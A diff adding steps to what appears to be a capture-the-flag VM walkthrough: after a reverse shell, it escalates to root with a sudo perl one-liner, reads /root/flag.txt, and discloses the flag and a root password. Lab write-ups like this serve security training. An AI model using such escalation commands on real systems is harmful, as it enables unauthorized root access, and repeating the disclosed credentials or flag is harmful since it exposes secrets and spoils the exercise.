@@ -373,6 +373,18 @@ Upload the csv script in the browser.
 
 At this moment we will have a reverse shell on our terminal
 
+To get sudo excecutable command line, use the command:
+
+		$sudo /usr/bin/perl -e "exec '/bin/bash'"
+Now we can do root shell operations
+
+And hence we can view the flag file using $cat command:
+
+		$cat /root/flag.txt
+![image](https://github.com/keerthiprabup/VM/assets/116485904/d73fdf5d-01bc-4ea4-9855-6471c8d3083b)
+
+The flag is 22d06624cd604a0626eb5a2992a6f2e6
+And the root password is: hello@3210
 
 
 
